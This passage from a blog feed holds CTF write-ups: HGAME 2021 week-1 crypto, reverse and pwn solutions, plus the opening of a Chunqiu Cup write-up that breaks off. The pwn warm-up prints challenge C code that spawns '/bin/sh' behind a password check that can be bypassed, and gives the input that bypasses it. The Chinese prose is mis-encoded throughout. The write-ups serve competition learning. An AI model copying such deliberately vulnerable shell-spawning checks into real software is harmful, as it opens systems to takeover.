class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># base_dir = "enc/"</span>base_dir <span class="token operator">=</span> <span class="token string">"ori/"</span>filenames <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>base_dir<span class="token punctuation">)</span><span class="token keyword">for</span> filename <span class="token keyword">in</span> filenames<span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base_dir <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># if "â€™" in content:</span>    <span class="token comment"># if 'b' in content and 'l' in content:</span>    <span class="token keyword">if</span> content<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'====='</span><span class="token punctuation">)</span>ori1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""hat you want but it will be â€œcorrectâ€.anotrogram correctnessâ€ and many gstance. rust offers a form of â€œpme; we donâ€™t have to worry about thefrom runtime checking of constraints and invariants;mpile times to be pretty beefy; our cpus a memory safety; it definitely excites us knoduction for the last few years and weâ€™veif youâ€™re new to rust, start small and buildstarted this project. weâ€™ve beential localization implementation to meet the require"""</span>enc1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""qpo daz rpio mzo fo rfuu mh â€œeannheoâ€.piaonaynpt eannheoihkkâ€ pic tpid ykopieh. nzko asshnk p sant as â€œxth; rh caiâ€™o qpvh oa rannd pmazo oqhsnat nziofth eqhejfiy as eaikonpfiok pic fivpnfpiok;txfuh ofthk oa mh xnhood mhhsd; azn exzk p thtand kpshod; fo chsfifohud hgefohk zk jiaczeofai san oqh upko shr dhpnk pic rhâ€™vhfs dazâ€™nh ihr oa nzko, kopno ktpuu pic mzfuckopnohc oqfk xnawheo. rhâ€™vh mhhiofpu uaepufbpofai ftxuhthiopofai oa thho oqh nhlzfnh"""</span>pair <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> idx<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>enc1<span class="token punctuation">)</span><span class="token punctuation">:</span>    pair<span class="token punctuation">[</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> ori1<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token comment"># {'q': 'h', 'p': 'a', 'o': 't', ' ': ' ', 'd': 'y', 'a': 'o', 'z': 'u', 'r': 'w', 'i': 'n', 'm': 'b', 'f': 'i', 'u': 'l', 'h': 'e', 'â€œ': 'â€œ', 'e': 'c', 'n': 'r', 'â€': 'â€', '.': '.', '\n': '\n', 'y': 'g', 't': 'm', 'k': 's', 'c': 'd', 's': 'f', 'x': 'p', ';': ';', 'â€™': 'â€™', 'v': 'v', 'j': 'k', 'g': 'x', ',': ',', 'w': 'j', 'b': 'z', 'l': 'q'}</span>s<span class="token operator">=</span><span class="token triple-quoted-string string">"""Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk "qypth{hp5d_s0n_szi^3ic&amp;qh11a_}",Dai'o sanyho oa pcc oqh dhpn po oqh hic."""</span>r <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">:</span>        r <span class="token operator">+=</span> pair<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> i    <span class="token comment"># print(r)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment"># The lift bridge console system has only used password login since 2003, the password is "hgame{ea5y_f0r_fun^3nd&amp;he11o_}",Don't forget to add the year at the end.</span></code></pre><p>æœ€åå†åŠ ä¸Šå¹´ä»½</p><p><code>hgame{ea5y_f0r_fun^3nd&amp;he11o_2021}</code></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>ç»™äº† dis.dis human readable çš„å­—èŠ‚ç ï¼Œç›´æ¥é€†å‘ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">  <span class="token number">4</span>           <span class="token number">0</span> LOAD_GLOBAL              <span class="token number">0</span> <span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>              <span class="token number">2</span> LOAD_CONST               <span class="token number">1</span> <span class="token punctuation">(</span><span class="token string">'give me your flag:\n'</span><span class="token punctuation">)</span>              <span class="token number">4</span> CALL_FUNCTION            <span class="token number">1</span>              <span class="token number">6</span> STORE_FAST               <span class="token number">0</span> <span class="token punctuation">(</span>raw_flag<span class="token punctuation">)</span>  <span class="token number">5</span>           <span class="token number">8</span> LOAD_GLOBAL              <span class="token number">1</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>             <span class="token number">10</span> LOAD_FAST                <span class="token number">0</span> <span class="token punctuation">(</span>raw_flag<span class="token punctuation">)</span>             <span class="token number">12</span> LOAD_CONST               <span class="token number">2</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>             <span class="token number">14</span> LOAD_CONST               <span class="token number">3</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>             <span class="token number">16</span> BUILD_SLICE              <span class="token number">2</span>             <span class="token number">18</span> BINARY_SUBSCR             <span class="token number">20</span> CALL_FUNCTION            <span class="token number">1</span>             <span class="token number">22</span> STORE_FAST               <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>  <span class="token number">6</span>          <span class="token number">24</span> LOAD_GLOBAL              <span class="token number">2</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span>             <span class="token number">26</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>             <span class="token number">28</span> CALL_FUNCTION            <span class="token number">1</span>             <span class="token number">30</span> STORE_FAST               <span class="token number">2</span> <span class="token punctuation">(</span>length<span class="token punctuation">)</span>  <span class="token number">8</span>          <span class="token number">32</span> LOAD_GLOBAL              <span class="token number">3</span> <span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">)</span>             <span class="token number">34</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>length<span class="token punctuation">)</span>             <span class="token number">36</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">38</span> BINARY_FLOOR_DIVIDE             <span class="token number">40</span> CALL_FUNCTION            <span class="token number">1</span>             <span class="token number">42</span> GET_ITER        <span class="token operator">&gt;&gt;</span>   <span class="token number">44</span> FOR_ITER                <span class="token number">54</span> <span class="token punctuation">(</span>to <span class="token number">100</span><span class="token punctuation">)</span>             <span class="token number">46</span> STORE_FAST               <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token number">9</span>          <span class="token number">48</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>             <span class="token number">50</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">52</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>             <span class="token number">54</span> BINARY_MULTIPLY             <span class="token number">56</span> LOAD_CONST               <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>             <span class="token number">58</span> BINARY_ADD             <span class="token number">60</span> BINARY_SUBSCR             <span class="token number">62</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>             <span class="token number">64</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">66</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>             <span class="token number">68</span> BINARY_MULTIPLY             <span class="token number">70</span> BINARY_SUBSCR             <span class="token number">72</span> ROT_TWO             <span class="token number">74</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>             <span class="token number">76</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">78</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>             <span class="token number">80</span> BINARY_MULTIPLY             <span class="token number">82</span> STORE_SUBSCR             <span class="token number">84</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>             <span class="token number">86</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">88</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>             <span class="token number">90</span> BINARY_MULTIPLY             <span class="token number">92</span> LOAD_CONST               <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>             <span class="token number">94</span> BINARY_ADD             <span class="token number">96</span> STORE_SUBSCR             <span class="token number">98</span> JUMP_ABSOLUTE           <span class="token number">44</span> <span class="token number">12</span>     <span class="token operator">&gt;&gt;</span>  <span class="token number">100</span> BUILD_LIST               <span class="token number">0</span>            <span class="token number">102</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token number">13</span>         <span class="token number">104</span> LOAD_GLOBAL              <span class="token number">3</span> <span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">)</span>            <span class="token number">106</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>length<span class="token punctuation">)</span>            <span class="token number">108</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">110</span> GET_ITER        <span class="token operator">&gt;&gt;</span>  <span class="token number">112</span> FOR_ITER                <span class="token number">26</span> <span class="token punctuation">(</span>to <span class="token number">140</span><span class="token punctuation">)</span>            <span class="token number">114</span> STORE_FAST               <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token number">14</span>         <span class="token number">116</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token number">118</span> LOAD_METHOD              <span class="token number">4</span> <span class="token punctuation">(</span>append<span class="token punctuation">)</span>            <span class="token number">120</span> LOAD_GLOBAL              <span class="token number">5</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">)</span>            <span class="token number">122</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>            <span class="token number">124</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">126</span> BINARY_SUBSCR            <span class="token number">128</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">130</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token number">132</span> BINARY_XOR            <span class="token number">134</span> CALL_METHOD              <span class="token number">1</span>            <span class="token number">136</span> POP_TOP            <span class="token number">138</span> JUMP_ABSOLUTE          <span class="token number">112</span> <span class="token number">15</span>     <span class="token operator">&gt;&gt;</span>  <span class="token number">140</span> LOAD_GLOBAL              <span class="token number">6</span> <span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>            <span class="token number">142</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token number">144</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">146</span> LOAD_METHOD              <span class="token number">7</span> <span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">)</span>            <span class="token number">148</span> CALL_METHOD              <span class="token number">0</span>            <span class="token number">150</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token number">16</span>         <span class="token number">152</span> LOAD_GLOBAL              <span class="token number">8</span> <span class="token punctuation">(</span><span class="token keyword">print</span><span class="token punctuation">)</span>            <span class="token number">154</span> LOAD_CONST               <span class="token number">6</span> <span class="token punctuation">(</span><span class="token string">'your flag: '</span><span class="token punctuation">)</span>            <span class="token number">156</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token number">158</span> BINARY_ADD            <span class="token number">160</span> CALL_FUNCTION            <span class="token number">1</span>            <span class="token number">162</span> POP_TOP            <span class="token number">164</span> LOAD_CONST               <span class="token number">0</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>            <span class="token number">166</span> RETURN_VALUE<span class="token comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></code></pre><p>ç„¶åç…§æ ·å­å†™å‡ºæºç ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#</span><span class="token comment"># æºä»£ç </span><span class="token comment"># hgame{.+}</span>raw_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'give me your flag:\n'</span><span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>raw_flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your flag: '</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span class="token comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></code></pre><p>å¥½è€¶ï¼Œç›´æ¥å°±æ˜¯å¥‡å¶ä½äº¤æ¢ï¼Œç„¶åå¼‚æˆ–ä¸€ä¸‹ï¼Œé‚£ç›´æ¥åè¿‡æ¥å°±å®Œäº‹äº†ã€‚</p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># decode</span>res <span class="token operator">=</span> <span class="token string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span>x <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>res<span class="token punctuation">)</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</span></code></pre><p><code>hgame{G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~}</code></p><blockquote><p><strong>Extensive Reading:</strong></p><p><a href="https://www.yuque.com/cyberangel/rg9gdm/vebs87">ï¼ˆæ•´ç†ï¼‰Pythonå­—èŠ‚ç è¯¦è§£</a></p></blockquote><h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>å…³é”®çš„éƒ¨åˆ†åœ¨ä¸‹å›¾çš„ç¬¬39è¡Œã€‚</p><p>é¦–å…ˆè¯»å–è¾“å…¥ï¼Œç„¶åä¸ <code>sub_140001430</code> å‡½æ•°è¿”å›çš„ç»“æœè¿›è¡Œå¼‚æˆ–ï¼Œä¸å¯¹åˆ™è¾“å‡º wrong flagã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212552227.png" alt="å…³é”®éƒ¨åˆ†"></p><p>å†çœ‹ <code>sub_140001430</code>ï¼Œè¿”å›çš„æ˜¯ 0xFF é€’å‡çš„ç»“æœã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212818909.png"></p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212840860.png"></p><p>è€Œ <code>byte_140003480</code> æ˜¯æ¯”å¯¹çš„éƒ¨åˆ†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212924046.png"></p><p>äºæ˜¯å†™ä¸ªè„šæœ¬å¼‚æˆ–å°±å®Œäº‹äº†ã€‚</p><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python">xx <span class="token operator">=</span> <span class="token triple-quoted-string string">"""97 99..."""</span>x <span class="token operator">=</span> xx<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>r <span class="token operator">=</span> <span class="token string">''</span>cnt <span class="token operator">=</span> <span class="token number">0xff</span><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>    r <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> cnt<span class="token punctuation">)</span>    cnt <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment"># hgame{hello_re_player}</span></code></pre><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h3><p>ç­¾åˆ°é¢˜ï¼Œæºç éƒ½ç»™äº†ï¼Œå¥½è€¶ï¼</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">init_io</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> num<span class="token punctuation">;</span>    <span class="token function">init_io</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token string">"paSsw0rd"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//Do you know strcmp?</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you are right!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sorry, you are wrong.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201022306698.png" alt="çœ‹åœ°å€"></p><p> unsigned long long å’Œ char* æ¯”è¾ƒï¼Œçœ‹æŒ‡é’ˆåœ°å€å°±å¥½äº†ã€‚</p><p>0x402012 =&gt; 4202514</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201022617716.png" alt="flag"></p><p><code>hgame{W3lCOme_t0_Hg4m3_2222Z222zO2l}</code></p><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>ç¬¬ä¸€å‘¨ AK äº† Misc å’Œ Webï¼Œæ„Ÿè§‰é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚</p><p>å–µå‘œï¼Œbinary å¥½éš¾ä¸ä¼šåšï¼Œå˜¤å˜¤å˜¤ã€‚</p><p>å¥½å¿«å•Šï¼Œè¿™å‘¨å°±è¿‡å¹´äº†å–µ~</p><p><em>ï¼ˆæºœäº†æºœäº†</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 æ˜¥ç§‹æ¯ æ–°å¹´æ¬¢ä¹èµ› WriteUp</title>
      <link href="2021/02/03/CTF_2021chunqiu/"/>
      <url>2021/02/03/CTF_2021chunqiu/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/02/03/CTF_2021chunqiu/image-20210201202652728.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>å‰å‡ å¤©æœ‰ä¸ª 2021å¹´â€œæ˜¥ç§‹æ¯â€æ–°å¹´æ¬¢ä¹èµ›ï¼Œæ€»å…±æœ‰ 10 é“é¢˜ï¼Œé¢˜ç›®ä¸åˆ† misc/web/crypto/pwn/reverse/â€¦ï¼Œç»Ÿç§° Fungameã€‚</p><p>é¢˜ç›®ç”±2020å¹´æŠ€æœ¯çƒ­ç‚¹äº‹ä»¶ç±»å‹é¢˜ç›®ã€å¸¸è§„è€ƒç‚¹é¢˜ç›®ä»¥åŠä»¥å¾€æ¯”èµ›0è§£ä¸”æœªå…¬å¼€writeupçš„é¢˜ç›®ç»„æˆã€‚</p><blockquote><p>æœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨å…¨æ–°çš„æ²™æ¼ç§¯åˆ†æ¨¡å¼ï¼Œæ²™æ¼ç§¯åˆ†æ¨¡å¼æ˜¯ä¸€ç§é¢˜ç›®åˆ†å€¼éšç€æ—¶é—´çš„å¢åŠ è€Œé€æ¸å‡å°‘çš„ç§¯åˆ†æ¨¡å¼ï¼Œè¯¥ç§¯åˆ†æ¨¡å¼çš„è®¾å®šç›®çš„æ˜¯ä¸ºäº†æ¿€åŠ±é€‰æ‰‹äº‰å¤ºæ—¶é—´ç­”é¢˜ï¼Œæé«˜CTFæ¯”èµ›çš„ç«æŠ€æ€§ã€‚æ²™æ¼ç§¯åˆ†æ¨¡å¼ä¸‹ï¼Œé¢˜ç›®åˆ†å€¼çš„ä¸‹é™ä¸ä¼šå½±å“åˆ°ä¹‹å‰å¾—åˆ†è€…ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š2021å¹´1æœˆ29æ—¥10:00-1æœˆ31æ—¥17:00</p></blockquote><p>ç§¯åˆ†å•¥çš„ä¸å…³é”®ï¼Œå€’æ˜¯å¯¹é¢˜ç›®æœ‰ç‚¹æ„Ÿå…´è¶£å°±æ¥çœ‹çœ‹äº†ã€‚</p><p>è¯´å¥½çš„æ¬¢ä¹èµ›ï¼Œå…¶å®ä¸€ç‚¹éƒ½ä¸æ¬¢ä¹ï¼Œå¤ªåäº†ï¼</p><p>è¿™é‡Œéšæ„å†™å†™ WriteUp å¥½äº†ã€‚</p><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><blockquote><p>ä¸‡ç‰©çš†æœ‰â€FUNâ€ï¼Œç”µè„‘æ‰«â€FUNâ€æ´»åŠ¨ï¼Œæä¾›å¤§å†™çš„â€FUNâ€å­—æ ·ï¼Œå³å¯è·å–flag~</p></blockquote><p><em>ï¼ˆå±…ç„¶è°ƒç”¨äº†æ‘„åƒå¤´</em></p><p>ç›²çŒœæ˜¯è¯†åˆ«åˆ° <code>FUN</code> å°±å‡º flag äº†å§ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210129173917300.png" alt="flag"></p><p>ç”šè‡³è¿˜ä¿å­˜äº†ä¸€ä»½ <code>flag.txt</code> åˆ°ç›®å½•ä¸‹ 233.</p><p><code>flag{ju5t_f0r_FUN}</code></p><h2 id="åäºŒå®«çš„æŒ‘è¡…"><a href="#åäºŒå®«çš„æŒ‘è¡…" class="headerlink" title="åäºŒå®«çš„æŒ‘è¡…"></a>åäºŒå®«çš„æŒ‘è¡…</h2><blockquote><p>ä½†æ„¿ä½ 